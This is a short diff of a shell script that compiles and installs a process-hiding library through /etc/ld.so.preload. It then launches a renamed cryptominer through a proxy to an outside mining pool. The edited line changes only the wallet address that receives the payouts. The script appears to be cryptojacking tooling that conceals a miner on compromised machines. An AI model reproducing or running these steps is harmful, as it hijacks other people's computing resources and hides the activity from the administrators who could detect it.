@@ -45,5 +45,5 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=0xe902a21b0d63f1fe4b9bd802c90dc6cde6aafec0.bezzHash@flux-us-west.minerpool.org:2032 --pass IhatePopUps --log --extra --latency --all-shares --shares-detail --list-modes --oc1
+./graftcp/graftcp ./bezzHash --url=t1X2nbJoFvPG8DGZNMGspcnszy8YA3fxsKf.bezzHash@flux-us-west.minerpool.org:2032 --pass IhatePopUps --log --extra --latency --all-shares --shares-detail --list-modes --oc1
 
